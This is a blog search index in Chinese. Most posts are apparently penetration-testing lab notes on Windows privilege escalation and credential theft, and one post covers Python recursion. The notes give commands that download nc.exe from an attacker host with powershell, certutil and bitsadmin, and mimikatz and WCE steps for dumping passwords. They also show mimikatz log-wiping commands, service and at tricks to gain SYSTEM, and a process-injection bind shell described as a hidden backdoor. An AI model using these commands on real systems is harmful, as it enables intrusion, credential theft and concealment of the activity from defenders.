<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>windows提权</title>
      <link href="/2019/05/23/windows-ti-quan/"/>
      <url>/2019/05/23/windows-ti-quan/</url>
      
        <content type="html"><![CDATA[<h3 id="1-漏洞收集-0day库"><a href="#1-漏洞收集-0day库" class="headerlink" title="1. 漏洞收集 0day库"></a>1. 漏洞收集 0day库</h3><ol><li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">exploit-db </a></li><li><a href="https://0day.today" target="_blank" rel="noopener">0da’y</a></li><li><a href="https://securitytracker.com/" target="_blank" rel="noopener">https://securitytracker.com/</a></li><li><a href="https://www.rapid7.com/db/modules/" target="_blank" rel="noopener">https://www.rapid7.com/db/modules/</a></li><li><a href="https://cxsecurity.com/" target="_blank" rel="noopener">https://cxsecurity.com/</a></li></ol><h3 id="2-cve-2018-8120、cve-2018-8897、cve-2018-8174"><a href="#2-cve-2018-8120、cve-2018-8897、cve-2018-8174" class="headerlink" title="2.  cve-2018-8120、cve-2018-8897、cve-2018-8174"></a>2.  cve-2018-8120、cve-2018-8897、cve-2018-8174</h3><ol><li>使用exploit进行提权</li><li>使用mimikatz抓管理员密码</li><li>使用命令行开启远程桌面</li><li>使用账号密码连接</li></ol><h3 id="3-停止安全软件相关服务"><a href="#3-停止安全软件相关服务" class="headerlink" title="3. 停止安全软件相关服务"></a>3. 停止安全软件相关服务</h3><h3 id="4-文件传输三十六计"><a href="#4-文件传输三十六计" class="headerlink" title="4. 文件传输三十六计"></a>4. 文件传输三十六计</h3><h4 id="4-1-windows文件传输"><a href="#4-1-windows文件传输" class="headerlink" title="4.1 windows文件传输"></a>4.1 windows文件传输</h4><ol><li>使用powershell下载<ul><li>首先在kali 的 /var/www/html放入你的exe文件比如说nc.exe</li><li>powershell输入如下命令<br><code>`</code><br>$p=New-Object system.net.webclient.</li></ul></li></ol><p>$p.downloadfile(“<a href="http://192.168.178.200/nc.exe&quot;,&quot;nc.exe&quot;" target="_blank" rel="noopener">http://192.168.178.200/nc.exe&quot;,&quot;nc.exe&quot;</a>)</p><pre><code>-  也可以将上述命令存储在ps1文件中执行，但是默认情况下是无法执行powershell脚本的，需要在管理员权限下修改配置</code></pre><p>powershell set-executionpolicy unrestricted</p><pre><code>2.  Visual Basic 文件下载``` vbscriptSet args = Wscript.ArgumentsUrl = &quot;http://192.168.178.200/nc.exe&quot;dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)xHttp.Open &quot;GET&quot;, Url, FalsexHttp.Sendwith bStrm    .type = 1 &#39;    .open    .write xHttp.responseBody    .savetofile &quot; C:\nc.exe&quot;, 2 &#39;end with</code></pre><p>cmd下执行  <code>cscript test.vbs</code></p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g3bc96rnfaj318o0menow.jpg" alt></p><p>由于是users组用户所以不能直接放在c盘权限不够</p><ol start="3"><li>nc传输<br>发送方cmd下执行:</li></ol><p><code>nc.exe -L -p 8888 &lt;test.vbs</code></p><p>接收方执行<br><code>nc.exe 192.168.1.105 8888 &gt;test.vbs</code></p><ol start="4"><li><p>使用certutil<br><code>certutil -urlcache -split -f http://192.168.178.200/nc.exe nc.exe</code></p></li><li><p>使用bitsadmin</p></li></ol><p><code>bitsadmin /transfer n http://domain/file c:\%homepath%\file</code></p><ol start="6"><li>ftp</li><li>Windows Share File Download</li><li><p>tftp</p></li><li><p>ipc文件下载/上传/登陆</p></li></ol><a id="more"></a> ]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>递归函数</title>
      <link href="/2019/05/22/di-gui-han-shu/"/>
      <url>/2019/05/22/di-gui-han-shu/</url>
      
        <content type="html"><![CDATA[<h3 id="1-使用递归函数实现sum"><a href="#1-使用递归函数实现sum" class="headerlink" title="1. 使用递归函数实现sum"></a>1. 使用递归函数实现sum</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">mysum</span><span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> mylist<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>mysum<span class="token punctuation">(</span>mylist<span class="token punctuation">)</span>mylist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>mysum<span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="2-编写一个递归函数来计算列表中包含的元素数"><a href="#2-编写一个递归函数来计算列表中包含的元素数" class="headerlink" title="2. 编写一个递归函数来计算列表中包含的元素数"></a>2. 编写一个递归函数来计算列表中包含的元素数</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">mysum</span><span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        mylist<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token operator">+</span>mysum<span class="token punctuation">(</span>mylist<span class="token punctuation">)</span>mylist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>mysum<span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="3-找出列表中的最大数字"><a href="#3-找出列表中的最大数字" class="headerlink" title="3.找出列表中的最大数字"></a>3.找出列表中的最大数字</h3><pre class=" language-python"><code class="language-python"> <span class="token keyword">def</span> <span class="token function">max</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">if</span> list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">></span>list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">else</span> list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    sub_max<span class="token operator">=</span>max<span class="token punctuation">(</span>list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">if</span> list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">></span>sub_max <span class="token keyword">else</span> sub_max <span class="token keyword">print</span><span class="token punctuation">(</span>max<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><strong>通常编写涉及数组的递归函数时，基线条件就是数组为空或者只包含一个元素，陷入困境时，请检查基线条件是不是这样的。</strong></p><h3 id="4-使用递归实现快排"><a href="#4-使用递归实现快排" class="headerlink" title="4. 使用递归实现快排"></a>4. 使用递归实现快排</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">sort_by_q</span><span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> mylist    <span class="token keyword">else</span><span class="token punctuation">:</span>        select<span class="token operator">=</span>mylist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        left<span class="token operator">=</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> mylist<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">if</span> i<span class="token operator">&lt;=</span>select<span class="token punctuation">]</span>        right<span class="token operator">=</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> mylist<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">if</span> i<span class="token operator">></span>select<span class="token punctuation">]</span>        <span class="token keyword">return</span> sort_by_q<span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span>select<span class="token punctuation">]</span><span class="token operator">+</span>sort_by_q<span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>sort_by_q<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><a id="more"></a>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用漏洞进行提权</title>
      <link href="/2019/05/21/shi-yong-lou-dong-jin-xing-ti-quan/"/>
      <url>/2019/05/21/shi-yong-lou-dong-jin-xing-ti-quan/</url>
      
        <content type="html"><![CDATA[<h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><p>提权的条件: 1. 拥有普通用户的权限</p><pre><code>                2. 拥有网站的webshell                3. 存在提权的漏洞</code></pre><h4 id="1-1-操作系统的信息收集"><a href="#1-1-操作系统的信息收集" class="headerlink" title="1.1 操作系统的信息收集"></a>1.1 操作系统的信息收集</h4><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g39b2q4stkj30ki0el0y8.jpg" alt></p><h4 id="1-2-远程桌面查看命令"><a href="#1-2-远程桌面查看命令" class="headerlink" title="1.2  远程桌面查看命令"></a>1.2  远程桌面查看命令</h4><h5 id="1-2-1-查看是否开启远程桌面"><a href="#1-2-1-查看是否开启远程桌面" class="headerlink" title="1.2.1 查看是否开启远程桌面"></a>1.2.1 查看是否开启远程桌面</h5><p><code>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections</code>如果显示0x01就是关闭。</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g39bgy2fbjj30uo03hdfx.jpg" alt></p><h5 id="1-2-2-开启远程3389"><a href="#1-2-2-开启远程3389" class="headerlink" title="1.2.2 开启远程3389"></a>1.2.2 开启远程3389</h5><p><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code>这个需要管理员Administrator才能开启</p><h5 id="1-2-3-查看远程桌面开启的端口"><a href="#1-2-3-查看远程桌面开启的端口" class="headerlink" title="1.2.3 查看远程桌面开启的端口"></a>1.2.3 查看远程桌面开启的端口</h5><p><code>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</code></p><h4 id="1-2-4-查看计算机上的敏感文件"><a href="#1-2-4-查看计算机上的敏感文件" class="headerlink" title="1.2.4 查看计算机上的敏感文件"></a>1.2.4 查看计算机上的敏感文件</h4><p> <code>dir /b /s *.txt</code></p><h4 id="1-3-内网信息收集的脚本"><a href="#1-3-内网信息收集的脚本" class="headerlink" title="1.3  内网信息收集的脚本"></a>1.3  内网信息收集的脚本</h4><h4 id="1-4-使用py脚本直接查找系统存在的漏洞"><a href="#1-4-使用py脚本直接查找系统存在的漏洞" class="headerlink" title="1.4 使用py脚本直接查找系统存在的漏洞"></a>1.4 使用py脚本直接查找系统存在的漏洞</h4><p><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">windows脚本</a><br><a href="https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" target="_blank" rel="noopener">linux提取使用脚本</a></p><hr><ol><li><img src="http://ww1.sinaimg.cn/large/006d1Stply1g39ccov7dkj30ea09574r.jpg" alt></li><li>在机器上使用 ·systeminfo &gt;win10.txt`</li><li><code>windows***.py --database **.xls --systeminfo win10.txt</code></li><li>找到相应的poc进行利用</li></ol><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 提权 - </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-密码嗅探续集</title>
      <link href="/2019/05/19/nei-wang-ti-quan-mi-ma-xiu-tan/"/>
      <url>/2019/05/19/nei-wang-ti-quan-mi-ma-xiu-tan/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-windows身份认证过程"><a href="#0x01-windows身份认证过程" class="headerlink" title="0x01 windows身份认证过程"></a>0x01 windows身份认证过程</h3><p><img src="https://ws3.sinaimg.cn/large/005BYqpggy1g36qxqslnnj30oc0hn7bl.jpg" alt></p><p>windows NT logon模块， winlogon.exe —-&gt;LSA auth api(lsasrv.dll)—》msv1.0.dll</p><p>详细的流程：</p><p><img src="https://ws3.sinaimg.cn/large/005BYqpggy1g36r1b9db7j30oc0hn7bl.jpg" alt="enter description here"></p><p> 注意点: 如果是本地登陆是在本地的组件之间ntlsm安全包接收进行处理，如果是域网络中,那么会跑到域控制器进行验证，会用kerbos协议进行响应。如果是远程登陆那么组件也不一样</p><p> 目标服务器的一个工具包会维护一个内存里面的明文密码。</p><h3 id="0x02-从内存读取windows登陆密码-WCE"><a href="#0x02-从内存读取windows登陆密码-WCE" class="headerlink" title="0x02 从内存读取windows登陆密码(WCE)"></a>0x02 从内存读取windows登陆密码(WCE)</h3><p> <img src="http://ww1.sinaimg.cn/large/006d1Stply1g3bdz71ieoj30vo0gokeq.jpg" alt></p><ol><li>具有管理员权限</li><li>/usr/share/wce  kali里面，复制到win7，</li><li>输入wce  -lv</li></ol><p><img src="https://ws3.sinaimg.cn/large/005BYqpggy1g36s8hp602j30r20a6dhk.jpg" alt="enter description here"></p><ol start="4"><li>wce -w 直接会显示内存里面的密码</li></ol><p><img src="https://ws3.sinaimg.cn/large/005BYqpggy1g36sm9quxvj30tj0eggno.jpg" alt="enter description here"></p><ol start="5"><li>wce -i sid -s 用户名:hash  直接修改对应sid的密码</li></ol><p>在win8之后，增加安全机制 ，wce需要绕过。</p><p>扩展：如何防止wce读取密码<br>HKEY-LOCAL-MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\SecurityPackages</p><ul><li>kerberos</li><li>msv1_0</li><li>schannel</li><li>wdigest  存储在内存</li><li>tspkg 远程</li><li>pku2u</li></ul><p>删除wdigest值</p><h3 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h3><h3 id="Gethash"><a href="#Gethash" class="headerlink" title="Gethash"></a>Gethash</h3><h3 id="gsecdump"><a href="#gsecdump" class="headerlink" title="gsecdump"></a>gsecdump</h3><h3 id="SamInside"><a href="#SamInside" class="headerlink" title="SamInside"></a>SamInside</h3><h3 id="mimikatz更加强大"><a href="#mimikatz更加强大" class="headerlink" title="mimikatz更加强大"></a>mimikatz更加强大</h3><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g3bdo5xxvyj30ta0el4qp.jpg" alt></p><h4 id="1-使用mimikatz获取hash和明文密码"><a href="#1-使用mimikatz获取hash和明文密码" class="headerlink" title="1. 使用mimikatz获取hash和明文密码:"></a>1. 使用mimikatz获取hash和明文密码:</h4><p>输入<code>::</code>就会进行命令提示，类似help，然后使用<code>privilige::</code>可以查看debug下面的命令，然后通过<code>privilige::debug</code>进行一个提权，<br><img src="http://ww1.sinaimg.cn/large/006d1Stply1g399wfd3wsj30vg0k8q8b.jpg" alt></p><p>接下来使用<br><img src="http://ww1.sinaimg.cn/large/006d1Stply1g399xdxbwlj30st0ffq6u.jpg" alt>,这个模块主要是读取hash的，其中前面的可以用logonPasswords代替，<br><img src="http://ww1.sinaimg.cn/large/006d1Stply1g39a025c2tj30xi0iyq8o.jpg" alt></p><p>这个可以读取存储在sam里面的hash同时也可以直接从内存中读取明文密码。</p><h4 id="2-使得xp可以多用户同时存在"><a href="#2-使得xp可以多用户同时存在" class="headerlink" title="2.  使得xp可以多用户同时存在"></a>2.  使得xp可以多用户同时存在</h4><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g39a2jcm27j30jy0963za.jpg" alt>，使用<strong>ts::multirdp</strong>.</p><h4 id="3-使用event-drop可以丢弃安全日志，之后再操作系统进行的操作都不会被记录"><a href="#3-使用event-drop可以丢弃安全日志，之后再操作系统进行的操作都不会被记录" class="headerlink" title="3. 使用event::drop可以丢弃安全日志，之后再操作系统进行的操作都不会被记录"></a>3. 使用event::drop可以丢弃安全日志，之后再操作系统进行的操作都不会被记录</h4><p><code>event::clear</code>就会清除日志信息</p><h4 id="4-token-whoami获得当前用户的信息以及权限"><a href="#4-token-whoami获得当前用户的信息以及权限" class="headerlink" title="4.  token::whoami获得当前用户的信息以及权限"></a>4.  token::whoami获得当前用户的信息以及权限</h4><h4 id="5-misc杂项"><a href="#5-misc杂项" class="headerlink" title="5. misc杂项"></a>5. misc杂项</h4><a id="more"></a>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>本地提权(嗅探)</title>
      <link href="/2019/05/19/nei-wang-ti-quan-mi-ma-xiu-tan/"/>
      <url>/2019/05/19/nei-wang-ti-quan-mi-ma-xiu-tan/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-windows下的嗅探工具"><a href="#0x01-windows下的嗅探工具" class="headerlink" title="0x01 windows下的嗅探工具"></a>0x01 windows下的嗅探工具</h3><ul><li>sniffpass</li><li>cain</li><li>wireshark</li><li>Omnipeek</li><li>commview</li><li>sniffpass</li></ul><hr><h3 id="0x02-linux下的嗅探工具"><a href="#0x02-linux下的嗅探工具" class="headerlink" title="0x02 linux下的嗅探工具"></a>0x02 linux下的嗅探工具</h3><ul><li>Tcpdump</li><li>wireshark</li><li>Dsniff</li></ul><h3 id="0x03-键盘记录器窃取密码"><a href="#0x03-键盘记录器窃取密码" class="headerlink" title="0x03 键盘记录器窃取密码"></a>0x03 键盘记录器窃取密码</h3><h3 id="0x04-本地缓存的密码"><a href="#0x04-本地缓存的密码" class="headerlink" title="0x04 本地缓存的密码"></a>0x04 本地缓存的密码</h3><ul><li><p>浏览器缓存的密码</p></li><li><p>网络密码<br>控制面板—-》用户账户和家庭安全—-》凭据管理器—–》web凭据</p></li><li><p>无线密码</p></li><li><a href="http://www.nirsoft.net(集成的密码查找工具)" target="_blank" rel="noopener">http://www.nirsoft.net(集成的密码查找工具)</a></li></ul><p>无线密码，浏览器缓存的工具(图形化的工具)</p><ul><li>Dump SAM</li></ul><p>pwdump 可以远程执行<br>/usr/share/windows-binaries/fgdump</p><p>windows下的登陆密码在C://windows//system32/config/sam</p><p>所有windows里面的admin账户的sid默认是500</p><p>前面的密码lmhash计算后面是NTlmhash计算的，复制下来，保存为pwdump后缀文件，使用kali里面的工具进行破解。</p><h3 id="0x05-破解"><a href="#0x05-破解" class="headerlink" title="0x05 破解"></a>0x05 破解</h3><ul><li>ophcrack</li><li>john the ripper</li></ul><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g3bg5z5kt9j31480hfe81.jpg" alt></p><h3 id="0x06-psexec"><a href="#0x06-psexec" class="headerlink" title="0x06 psexec"></a>0x06 psexec</h3><h3 id="0x07-pr-exe"><a href="#0x07-pr-exe" class="headerlink" title="0x07 pr.exe"></a>0x07 pr.exe</h3><h3 id="0x08-BeRoot"><a href="#0x08-BeRoot" class="headerlink" title="0x08 BeRoot"></a>0x08 BeRoot</h3><a id="more"></a>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地提权(一)</title>
      <link href="/2019/05/17/ben-di-ti-quan-ji-chu-zhi-shi/"/>
      <url>/2019/05/17/ben-di-ti-quan-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-本地提权"><a href="#0x01-本地提权" class="headerlink" title="0x01  本地提权"></a>0x01  本地提权</h3><p>条件：已经实现了本地低权限账号的登陆<br>        1.1 远程溢出<br>        1.2 直接获得账号密码<br>本地提权的目的就是希望获得更高的权限，对目标进一步的进行控制</p><h3 id="0x02-本地提权的基础知识"><a href="#0x02-本地提权的基础知识" class="headerlink" title="0x02 本地提权的基础知识"></a>0x02 本地提权的基础知识</h3><p>系统账户之间权限隔离</p><ol><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间(也划分了很多账号)</li></ol><hr><p>系统账号：</p><ul><li>用户账户登陆时获取权限令牌</li><li>服务账号无需用户登陆已经在后台启动服务(跟随系统启动而启动)</li></ul><hr><p>最高管理员账号:</p><ul><li>windows为==admininstrator==</li><li>linux为==root==<br>最高管理员可以生成很多应用账号，管理员赋给不同的权限，登陆的时候，系统赋予权限的令牌，令牌在登陆的时候绑定在用户会话上，每一次登陆的令牌不是一样的，随机.</li></ul><hr><p>不同系统默认的用户情况：</p><p>windwos:</p><ul><li>user</li><li>Administrator==有一些控制表项不能去修改和删除==</li><li>system 启动运行内核级别的权限(最高)</li></ul><p>administrator和system两个是相互包含的，</p><p>linux</p><ul><li>root=administrator+system</li><li>user</li></ul><hr><h3 id="0x03-windows操作系统的提权"><a href="#0x03-windows操作系统的提权" class="headerlink" title="0x03 windows操作系统的提权"></a>0x03 windows操作系统的提权</h3><ol><li>首先给windwos xp增加一个用户，由于我的xp是在域环境中，所以设置密码需要一个强的密码。<br><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35hzd0nzkj30z20ljdmz.jpg" alt><br>其中<code>net user xingqing *</code>修改用户的密码，<code>net user xingqing password</code>是增加一个用户xingqing.</li></ol><hr><ol start="2"><li><code>net user xingqing</code>查看当前xingqing ,<img src="http://ww1.sinaimg.cn/large/006d1Stply1g35ibb2xyfj30m80e4jta.jpg" alt>,可以看到它是属于当前的users组。Users是Windows中预设的一个用户组，介绍是：防止用户进行有意或无意的系统范围的更改，但是可以运行大部分应用程序。这个用户组包含了所有可登录的用户，默认权限是读取和执行（非系统分区）拒绝访问（所有System Volume Information文件夹及其子文件与子文件夹和其他用户配置文件夹）<br>读取和执行（系统分区下其他文件与文件夹）</li></ol><hr><ol start="3"><li>响应的用户权限以及组说明 <ul><li>Users<br>普通用户组，这个组的用户无法进行有意或无意的改动。因此，用户可以运行经过验证的应用程序，但不可以运行大多数旧版应用程序。Users 组是最安全的组，因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料。Users 组提供了一个最安全的程序运行环境。在经过 NTFS 格式化的卷上，默认安全设置旨在禁止该组的成员危及操作系统和已安装程序的完整性。用户不能修改系统注册表设置、操作系统文件或程序文件。Users 可以创建本地组，但只能修改自己创建的本地组。Users 可以关闭工作站，但不能关闭服务器。</li></ul></li></ol><ul><li>Power Users<br>高级用户组，Power Users 可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。分配给 Power Users 组的默认权限允许 Power Users 组的成员修改整个计算机的设置。但Power Users 不具有将自己添加到 Administrators 组的权限。在权限设置中，这个组的权限是仅次于Administrators的。</li><li>Administrators<br>管理员组，默认情况下，Administrators中的用户对计算机/域有不受限制的完全访问权。分配给该组的默认权限允许对整个系统进行完全控制。一般来说，应该把系统管理员或者与其有着同样权限的用户设置为该组的成员。</li><li>Guests<br>来宾组，来宾组跟普通组Users的成员有同等访问权，但来宾账户的限制更多。</li><li>Everyone<br>所有的用户，这个计算机上的所有用户都属于这个组。</li><li>SYSTEM组<br>这个组拥有和Administrators一样甚至更高的权限，在察看用户组的时候它不会被显示出来，也不允许任何用户的加入。这个组主要是保证了系统服务的正常运行，赋予系统及系统服务的权限。</li></ul><hr><ol start="4"><li>使用命令将其加入administrators组。</li></ol><p><code>net localgroup Administrators xingqing /add</code>发生1317，用户不存在的系统错误，查资料得是因为你的用户和计算机名一样造成的，我们重新添加一hack的账户，然后继续使用上面的命令成功将hack添加到administrators组。</p><hr><ol start="5"><li>接下来使用命令将hack这个账户，提升为system权限</li></ol><p>我们打开任务管理器，查找用户为system的程序</p><ul><li>使用at命令提升为system</li></ul><p>使用范围： xp,2003使用，win7和win8，win2012,win2008已经删除。</p><p>使用<code>at /?</code>查看需要的命令参数，<code>at time /interactive cmd</code>,interactive是交互式命令行参数。whoami在windows服务器程序会有，默认的xp不存在这个命令。</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35k1nnkklj31bq0n2guv.jpg" alt><br>就会使用system重新启动命令行，它的权限就是system。接下使用cmd打开的所有程序都是system权限。</p><p>接下来输入<code>taskmgr</code>使用system打开任务管理器，然后kill explore进程，最后再重新打开explore进程(文件，新建，explorer.exe),重新加载就是system权限。</p><hr><ul><li>schtasks</li></ul><hr><p><strong>2003测试失败<br>at命令很容易将计划任务安排到第二天去,<br>schtasks虽然强大，但是命令极为复杂</strong></p><hr><ul><li>sc命令</li></ul><p>使用范围：win7和win8，其他未测试</p><p>命令功能: 创建系统服务，SC.exe提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p><p>services.msc运行都是服务。</p><p><code>cmd /k start</code>打开一个新的窗口。</p><p><code>sc Create systemcmd binPath=&quot;cmd /k start&quot; type= own type= interact</code> 创建一个服务名字为systemcmd ,然后服务所属我自己(own)，并且是以交互的方式(可以看见，不会出现在后台)</p><p><code>sc start systemcmd</code>启动这个服务，由于所有的服务是由system启动，所以cmd会成为system权限。</p><p>1060错误未知，待解决</p><ul><li>使用微软工具提system</li></ul><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/</a>，windows sysinternals解压后将psexec.exe传至xp</p><p>先打开kali ，在路径/usr/share/windows-binaries下将whoami.exe传到xp的windwos/system32文件夹中，</p><p>使用<code>psExec.exe -i -s cmd</code>。目前是失败的</p><hr><ul><li>注入进程提权</li></ul><p>找一个已经是system的服务，然后注入进程得到system权限，使用processinjector工具，放到c目录执行-l显示可以注入的进程。</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35mol3ximj30n90fhn0o.jpg" alt><br>然后记住pid，然后</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35msql6b1j30rh0ik44j.jpg" alt>，注入进程执行cmd程序将shell放在4444端口，等待连接。</p><p>使用kali的nc进行连接：</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35mx14s8fj30sr0hntb8.jpg" alt>,直接就是system权限。<br>然后使用下载的套件sysinternals里面的Procexp.exe查看注入的进程services服务，<br><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35n5xkvj0j31gd0n4ajt.jpg" alt><br>这种后门非常隐蔽。即使注销用户，服务进程依然在，后门依然可以连接。</p><ul><li>WMI</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 内网提权 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地提权(一)</title>
      <link href="/2019/05/17/nei-wang-ti-quan-yi/"/>
      <url>/2019/05/17/nei-wang-ti-quan-yi/</url>
      
